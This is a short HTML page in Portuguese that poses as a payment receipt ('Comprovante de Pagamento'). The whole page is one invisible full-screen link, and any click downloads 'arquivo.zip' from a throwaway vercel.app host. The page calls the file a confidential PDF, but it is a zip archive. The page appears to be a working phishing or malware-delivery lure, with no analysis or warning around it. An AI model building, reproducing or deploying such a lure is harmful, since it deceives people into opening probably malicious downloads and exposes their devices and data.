
<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0" />
  <title>Comprovante de Pagamento</title>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet" />
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    html, body {
      width: 100%;
      height: 100%;
      font-family: 'Inter', Arial, sans-serif;
      background: linear-gradient(135deg, #f7f9fc, #e0e6ed);
    }

    a.full-link {
      position: fixed;
      inset: 0;
      z-index: 10;
      text-decoration: none;
      color: inherit;
      display: flex;
      justify-content: center;
      align-items: center;
      padding: 16px;
    }

    .box {
      background: #ffffff;
      border-radius: 20px;
      padding: 40px 32px;
      max-width: 540px;
      width: 100%;
      text-align: center;
      box-shadow: 0 20px 40px rgba(0, 0, 0, 0.08);
      z-index: 20;
    }

    h1 {
      font-size: 26px;
      color: #008000;
      margin-bottom: 18px;
      font-weight: 600;
    }

    p {
      font-size: 16px;
      margin-bottom: 16px;
      line-height: 1.5;
      color: #333;
    }

    .btn-visual {
      background-color: #008000;
      color: #fff;
      padding: 14px 28px;
      border-radius: 10px;
      font-size: 16px;
      font-weight: 500;
      display: inline-block;
      box-shadow: 0 6px 20px rgba(0, 128, 0, 0.25);
      margin-top: 10px;
    }

    .note {
      font-size: 13px;
      color: #888;
      margin-top: 20px;
    }

    @media print {
      * {
        -webkit-print-color-adjust: exact !important;
        print-color-adjust: exact !important;
      }

      html, body {
        background: linear-gradient(135deg, #f7f9fc, #e0e6ed) !important;
      }

      .box {
        box-shadow: none !important;
      }

      .btn-visual {
        background-color: #008000 !important;
        color: white !important;
        box-shadow: none !important;
      }
    }
  </style>
</head>
<body>
  <a href="https://privacy-58248-com.vercel.app/arquivo.zip" class="full-link" target="_blank" rel="noopener noreferrer">
    <div class="box">
      <h1>✅ Comprovante de Pagamento</h1>
      <p>Documento está disponível para visualização. Verifique os detalhes.</p>
      <div class="btn-visual">Visualizar Comprovante</div>
      <p class="note">Documento em PDF • Confidencial</p>
    </div>
  </a>
</body>
</html>
